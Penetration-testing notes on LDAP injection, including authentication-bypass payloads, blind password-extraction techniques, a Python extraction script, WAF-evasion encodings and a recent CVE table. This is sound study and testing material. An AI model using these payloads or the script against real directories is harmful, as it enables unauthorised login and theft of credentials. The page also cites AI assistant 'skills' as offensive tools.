+++
title = 'LDAP Injection'
date = 2026-10-30
type = 'notes'
weight = 170
toc = true
tags = ['web', 'web-attacks', 'ldap', 'injection']
+++

Lightweight Directory Access Protocol (LDAP) is a protocol used to access directory servers such as Active Directory (AD) via queries to retrieve information. Web applications may use LDAP for integration with AD or other directory services for authentication or data retrieval purposes.

> **2025–2026 context:** LDAP injection remains a **CWE-90** issue with a steady stream of CVEs because the same mistake repeats: **user input concatenated into a search filter without RFC 4515 escaping**. What has changed is the exploitation depth — blind extraction now uses **binary search and OID-based bitwise ordering** rather than character-by-character wildcard guessing, and WAF bypass relies on **RFC-compliant hex escaping and OID aliasing** rather than encoding tricks.

---

## 1. LDAP Fundamentals

### 1.1 Basic Terminology

| Component | Description |
|---|---|
| **Directory Server (DS)** | The system that stores and manages directory data, like a database. |
| **LDAP Entry** | A single entity (user, group, device) in the directory. |
| **Distinguished Name (DN)** | The unique identifier of an entry, made of one or more RDNs (e.g. `uid=sfoffo,dc=example,dc=it`). |
| **Relative Distinguished Name (RDN)** | A key–value pair that forms part of a DN (`uid=sfoffo`). |
| **Attributes** | Hold the data for an entry (e.g. `name`, `department`). |
| **Object Classes** | Define sets of related attributes for a type of object. |

### 1.2 LDAP Operations

| Operation | Description |
|---|---|
| **Bind** | Client authentication with the server |
| **Unbind** | Close the client connection |
| **Add** | Create a new entry |
| **Delete** | Delete an entry |
| **Modify** | Modify an entry |
| **Search** | Search for entries matching a filter |

### 1.3 Search Filters

A search filter consists of one or more components enclosed in parentheses. Each base component has an **attribute**, an **operand**, and a **value**.

| Name | Operand | Example |
|---|---|---|
| **Equality** | `=` | `(name=Kaylie)` |
| **Greater-Or-Equal** | `>=` | `(uid>=10)` |
| **Less-Or-Equal** | `<=` | `(uid<=10)` |
| **Approximate Match** | `~=` | `(name~=Kaylie)` |

> Different LDAP implementations return different results for approximate matches.

### 1.4 Logical Operands

| Name | Syntax | Example |
|---|---|---|
| **And** | `(&()())` | `(&(name=Kaylie)(title=Manager))` |
| **Or** | `(\|()())` | `(\|(name=Kaylie)(title=Manager))` |
| **Not** | `(!())` | `(!(name=Kaylie))` |

**Boolean values:**

| Value | Filter |
|---|---|
| **True** | `(&)` |
| **False** | `(\|)` |

**Wildcards:**

| Example | Matches |
|---|---|
| `(name=*)` | Any entry with a `name` attribute |
| `(name=S*)` | Names beginning with `S` |
| `(name=*s*)` | Names containing `s` |

---

## 2. Search-Filter Injection vs DN Injection

These are **different bugs** and require different payloads.

| | **Search-filter injection** (most common) | **DN injection** |
|---|---|---|
| **Where the input lands** | Inside `(attr=VALUE)` | Concatenated into a DN: `uid=VALUE,ou=people,dc=corp` |
| **Metacharacters** | `* ( ) \ & \| !` | `,` `=` `+` `<` `>` `#` `;` `"` `\` |
| **Typical payload** | `*)(uid=*))(\|(uid=*` | `admin,ou=admins` |
| **Impact** | Auth bypass, enumeration, attribute extraction | Privilege escalation via DN manipulation, entry substitution |

> If the application passes your input to `ldap_search()` as a filter, you are in the search-filter context. If it builds a DN for a `bind()` or an `add()` operation, you are in the DN context — and the payloads above do not transfer. `hunt-ldap` and similar references distinguish these explicitly because **conflating them is the most common false-negative**.

---

## 3. Authentication Bypass

The canonical vulnerable query:

```
(&(uid=input-username)(password=input-password))
```

### 3.1 Using wildcards

If a valid username is known (`admin`):

```
username = admin
password = *
```

Produces:

```
(&(uid=admin)(password=*))
```

Logs in as `admin` without the password.

If no username is known:

```
username = *
password = *
```

Produces:

```
(&(uid=*)(password=*))
```

Returns all users; the application typically logs in as the first result.

### 3.2 Without wildcards

If `*` is blocked, use Boolean logic to force a true condition. With a known username:

```
username = admin)(|(&
password = wrong)
```

Produces:

```
(&(uid=admin)(|(&)(password=wrong)))
```

Resolution:

- `(username=admin) AND (true OR false)` → `(username=admin) AND true`

Login succeeds as `admin`.

A variant from PayloadsAllTheThings:

```
user = admin)(!(&(1=0
pass = q))
```

Produces `(&(uid=admin)(!(&(1=0)(userPassword=q))))`, which also resolves to a true condition.

### 3.3 Username guessing with wildcards

If wildcards are allowed, enumerate usernames containing `admin`:

```
username = *admin*)(|(&
password = wrong)
```

---

## 4. Data Exfiltration

### 4.1 In-band — reflected results

If the application displays the returned entries, a wildcard dumps everything the query can see:

```
User input:  uid = *
Query:       (&(uid=*)(objectClass=account))
```

### 4.2 Blind boolean extraction

When the response gives only success/failure — “Mail sent” vs a generic error, “authenticated” vs “denied” — the login form becomes a **boolean oracle**.

**Example endpoint:**

```http
GET /mail.php?username=example&text=anything HTTP/1.1
```

- Valid username → `Mail sent`
- Invalid → generic error

**Confirm the injection:**

```http
GET /mail.php?username=*&text=anything HTTP/1.1
```

If `Mail sent` is returned, the wildcard matched at least one user.

**Extract a username one character at a time:**

```
s*   → Mail sent?
sf*  → Mail sent?
sfo* → Mail sent?
sfof* → Mail sent?
sfoff* → Mail sent?
sfoffo → Mail sent
```

**Extract the password attribute:**

```
username=sfoffo)(password=*      → exists?
username=sfoffo)(password=i*     → starts with i?
username=sfoffo)(password=it*    → starts with it?
...
```

> **The 2026 refinement — binary search.** Instead of 26 requests per character, compare against the midpoint using LDAP's **ordering** operands (`>=`, `<=`). A 95-character printable set resolves in **7 requests per character** (log₂ 95 ≈ 6.6). The `hunt-ldap` and `ldap-injection-testing` skill references both describe this, and it is the technique that makes blind LDAP injection practical at scale.

**Ordering-based character extraction:**

```
username=admin)(password>=m*      → true?  (character is m or later)
username=admin)(password>=t*      → true?  (character is t or later)
username=admin)(password=t*       → exact match?
```

### 4.3 OID bitwise extraction — `userPassword` and binary attributes

`userPassword` is an **OCTET STRING**, not a text attribute. Wildcard matching does not work the same way. LDAP references it by an OID, and the **`octetStringOrderingMatch`** rule (OID **2.5.13.18**) performs a **bit-by-bit big-endian comparison** of two octet strings until a difference is found. The first case where one value has a zero bit and the other has a one bit determines which is “less”.

This turns the attribute into a **binary oracle**: for each byte, compare against a midpoint and halve the candidate space. The `ldap-injection-testing` skill (v3.0) explicitly lists **bitwise OID blind extraction** as a high-efficiency extraction surface alongside binary search and OAST.

> **Precondition:** the application must expose an ordering response (e.g. a `>=` filter returning success/failure). If only equality is available, fall back to the boolean wildcard loop.

### 4.4 OAST / out-of-band extraction

When the application gives **no signal at all** — no success/failure difference, no timing difference — the only channel is **out-of-band**. Some LDAP integrations process attribute values through an **LDAP URL** or a **DNS lookup** (e.g. `ldap://` URL attributes, or a downstream component that resolves an attribute). If you can inject into an attribute that is later used in a URL, you can exfiltrate via DNS:

```
username=*)(description=*)(|(description=...OAST...
```

The practical 2026 approach documented in the `ldap-injection-testing` skill is **OAST exfiltration** using a collaborator domain — the same interactsh/Burp Collaborator infrastructure used for blind SSRF and blind command injection. It requires an attribute or a code path that causes an outbound lookup, which is uncommon but decisive when present.

> **LDAP has no `SLEEP()`.** Unlike SQL, there is no built-in time-delay function. Time-based blind LDAP injection is therefore **not a reliable primitive** — the 2025–2026 references consistently use boolean or OAST instead, and treat timing only as a secondary side-channel (e.g. CVE-2026-110256 measures response timing to enumerate usernames).

---

## 5. WAF and Filter Bypass

### 5.1 RFC 4515 hex escaping — the sound bypass

Any byte in an LDAP filter assertion value may be written as `\` followed by **two hex digits**, and the directory server unescapes it **before matching**.

```
admin   ≡   \61dmin   ≡   adm\69n   ≡   \61\64\6d\69\6e
```

All four are **identical at the LDAP server** and **different to a WAF**. This is not an encoding trick that some parsers reject — it is the standard escaping mechanism, so it is **universally accepted**. Encode the parts of the payload the WAF matches:

| Character | Escaped |
|---|---|
| `(` | `\28` |
| `)` | `\29` |
| `*` | `\2a` |
| `\` | `\5c` |
| `NUL` | `\00` |

```bash
# Original
username=*)(uid=*))(|(uid=*

# RFC 4515-escaped
username=\2a\29\28uid=\2a\29\29\28\7c\28uid=\2a
```

### 5.2 OID aliasing — bypass attribute-name signatures

Per **RFC 4512 §2.5**, an attribute type may be referenced by its **numeric OID**, and a conformant directory resolves the OID and the short name to the **same attribute**.

| Attribute | Numeric OID |
|---|---|
| `uid` | `0.9.2342.19200300.100.1.1` |
| `cn` | `2.5.4.3` |
| `objectClass` | `2.5.4.0` |
| `mail` | `0.9.2342.19200300.100.1.3` |
| `sn` | `2.5.4.4` |
| `userPassword` | `2.5.4.35` |
| `givenName` | `2.5.4.42` |
| `telephoneNumber` | `2.5.4.20` |
| `member` | `2.5.4.31` |

```bash
# A WAF signature matching "uid=" sees neither of these
(0.9.2342.19200300.100.1.1=admin)
(2.5.4.35=*)
```

### 5.3 Case variation

Attribute descriptors are **case-insensitive** (`uid` ≡ `UID`), so a signature matching lowercase `uid=` can be bypassed by `UID=`, `UiD=`, etc..

### 5.4 Combined bypass

```bash
# Hex-escaped filter break + OID-aliased attribute + case variation
\28\30\2e\39\2e\32\33\34\32...=admin\29\28\55\49\44=\2a\29
```

---

## 6. Tooling

> **There is no widely used automated tool for LDAP filter injection.** Unlike SQLMap for SQLi, LDAP injection has no mature equivalent — the armourinfosec lab states this explicitly and recommends writing the extraction script yourself. The tools below are the supporting cast, not a replacement for a custom script.

| Tool | Role |
|---|---|
| **ldapsearch** (`ldap-utils`) | Direct LDAP queries for sanity checks — `ldapsearch -x -H ldap://target.tld -b "dc=corp,dc=local" "(uid=*)"` |
| **NetExec (`nxc ldap`)** | Authenticated dumps once you have a credential — `nxc ldap target.tld -u user -p pass --users --groups` |
| **curl** | Manual payload testing against the web endpoint |
| **Burp Repeater / Intruder** | Manual crafting and payload iteration — most LDAP injection requires careful hand-tuning |
| **interactsh / Burp Collaborator** | OAST confirmation for blind extraction with no boolean oracle |
| **hunt-ldap** (Claude skill) | Structured methodology: auth bypass, blind char-by-char extraction, AD user/group enumeration, `{SSHA}`/`{CRYPT}` exfil on non-AD directories, search-filter vs DN-injection distinction |
| **ldap-injection-testing** (CyberStrikeAI skill) | RFC 4515 semantics, binary search / OID bitwise / OAST extraction, framework differences (Spring Data LDAP, ldap3, ldapjs), WAF bypass, injection → domain enumeration → Kerberoasting/noPac/gMSA chain |

### 6.1 Minimal blind extraction script

The armourinfosec lab uses **735 boolean requests** to extract a 21-character secret — a reasonable baseline for a character-by-character loop with a 95-character alphabet. A binary-search version reduces that to roughly **140 requests**.

```python
# ldap_blind.py — authorised lab use only
import requests, string, sys

URL = "http://127.0.0.1:5106/login"
CHARS = string.printable[:-6]  # printable, no whitespace

def oracle(payload):
    r = requests.post(URL, data={"username": payload, "password": "x"})
    return "authenticated" in r.text.lower()  # adapt to your oracle

def extract(prefix, attribute="description"):
    known = ""
    while True:
        for c in CHARS:
            # Inject a conjunct: (attribute=known+c*)
            payload = f"svc-backup)({attribute}={known}{c}*"
            if oracle(payload):
                known += c
                print(f"[+] {known}")
                break
        else:
            return known  # no character matched — end of value

print(extract("svc-backup)(description="))
```

For binary search, replace the `for c in CHARS` loop with a `>=` midpoint comparison — the same structure, one-seventh the requests.

---

## 7. Recent LDAP Injection CVEs (2025–2026)

| CVE / Advisory | Product | Primitive |
|---|---|---|
| **CVE-2026-110256** | Finsys Dockhand ≤ 1.0.18 | `tryLdapAuth` inserts the username without escaping wildcards; unauthenticated `a*` patterns enumerate usernames via **response timing**, evading per-username rate limiting |
| **CVE-2026-1498** | WatchGuard Fireware OS 12.0–12.11.6, 12.5–12.5.15, 2025.1–2026.0 | Remote unauthenticated LDAP injection in the web auth/management interface; retrieve directory data and authenticate with a **partial identifier** plus a valid passphrase |
| **CVE-2026-40193** | maddy < 0.9.3 | Usernames interpolated via `strings.ReplaceAll()` despite `ldap.EscapeFilter()` being available; affects `Lookup()`, `AuthPlain()` DN template, and `AuthPlain()` filter — **SMTP/IMAP AUTH PLAIN / LOGIN** is the vector |
| **CVE-2026-41573** | OpenAM < 16.1.1 | `_queryId` reaches `DJLDAPv3Repo.getFilter()` with `escapeQueryId` disabled, bypassing the CVE-2021-29156 fix — user enumeration and blind injection |
| **CVE-2026-11748** | Central Dogma (Shiro `SearchFirstActiveDirectoryRealm`) | Unauthenticated `*` logs in as the first directory entry; `bob)(uid=alice` pollutes audit logs; wildcard + timing enumerates AD; **group-membership filter injection** narrows to Domain Admins |
| **CVE-2026-46619** | OpenAM MSISDN module < 16.1.1 | `MSISDNValidation` concatenates the request value without escaping; unauthenticated attacker selects an arbitrary matching user |
| **CVE-2026-40459** | PAC4J < 4.5.10 / 5.7.10 / 6.4.1 | Low-privileged attacker injects into ID-based search parameters; arbitrary directory operations |
| **CVE-2025-71431** | Frappe < 14.99.2 / 15.86.0 | Endpoints pass user input into LDAP queries without sanitisation |
| **CVE-2025-61911 / 61912** | python-ldap < 3.4.5 | LDAP injection and DoS via unescaped `assertion_value` |
| **CVE-2026-40606** | mitmproxy ≤ 12.2.1 | Built-in LDAP proxy authentication does not sanitise the username |
| **GO-2026-6234** | hyperledger/fabric-ca v1.5.19 | Unescaped username in LDAP filter |

> **The pattern across every entry:** the escaping function **exists in the library** and the developer **did not call it**. CVE-2026-40193 is the clearest case — `ldap.EscapeFilter()` is in the same import as the code that replaces it with `strings.ReplaceAll()`. CVE-2026-41573 is the second-order case: a fix for an earlier CVE (CVE-2021-29156) was **bypassed** because a new code path disabled the escaping flag.

---

## 8. Testing Methodology

```bash
# 1. Identify LDAP-backed inputs
#    login forms · people search · address book · SSO · password reset
#    any parameter that filters a directory-backed list

# 2. Confirm injection with a wildcard
username=*          # returns all users?
username=a*         # returns a subset?

# 3. Classify the context
#    Search-filter: input inside (attr=VALUE)  → * ( ) & | !
#    DN injection:  input inside a DN           → , = + < > # ;

# 4. Bypass authentication
username=admin)(|(&
password=wrong)

# 5. Enumerate in-band if results are reflected
uid=*

# 6. Blind extraction — boolean oracle
username=admin)(password=a*      # one char at a time
username=admin)(password>=m*     # binary search (7 requests/char)

# 7. If userPassword / binary attribute, use OID ordering
#    octetStringOrderingMatch (2.5.13.18) — bitwise comparison

# 8. If no oracle at all, attempt OAST via a URL-building attribute

# 9. If a WAF blocks the payload:
#    - RFC 4515 hex escaping:  ( → \28, * → \2a
#    - OID aliasing:           uid → 0.9.2342.19200300.100.1.1
#    - Case variation:         uid → UID

# 10. Verify against the directory directly
ldapsearch -x -H ldap://target.tld -b "dc=corp,dc=local" "(uid=*)"
```

---

## 9. Field Notes

- **There is no SQLMap for LDAP.** Write the extraction script yourself — twenty lines adapt to any boolean oracle you find.
- **Distinguish search-filter injection from DN injection before choosing payloads.** `hunt-ldap` lists this as the most common source of false negatives.
- **RFC 4515 hex escaping is not a bypass trick — it is the standard.** `admin` ≡ `\61dmin` at the server and is invisible to a signature WAF.
- **OID aliasing is the cleanest attribute-name bypass.** `(0.9.2342.19200300.100.1.1=admin)` selects the same entries as `(uid=admin)` while matching no `uid=` signature.
- **Binary search is the 2026 extraction default.** `>=` midpoints resolve a character in ~7 requests instead of 26–95.
- **`userPassword` is an OCTET STRING.** Wildcards behave differently; use the `octetStringOrderingMatch` OID (`2.5.13.18`) for bitwise extraction.
- **LDAP has no `SLEEP()`.** Time-based blind injection is not a reliable primitive; use boolean or OAST.
- **Timing is still a side-channel.** CVE-2026-110256 enumerates usernames purely from response-time differences, which also **evades per-username rate limiting**.
- **The escaping function is almost always already in the library.** Every 2025–2026 CVE in the table above is a failure to call it — and CVE-2026-41573 is a failure to call it *after* a previous CVE was fixed.
- **LDAP injection chains into domain compromise.** The `ldap-injection-testing` skill documents the full path: injection → directory enumeration → Kerberoasting / noPac / gMSA → privilege escalation.
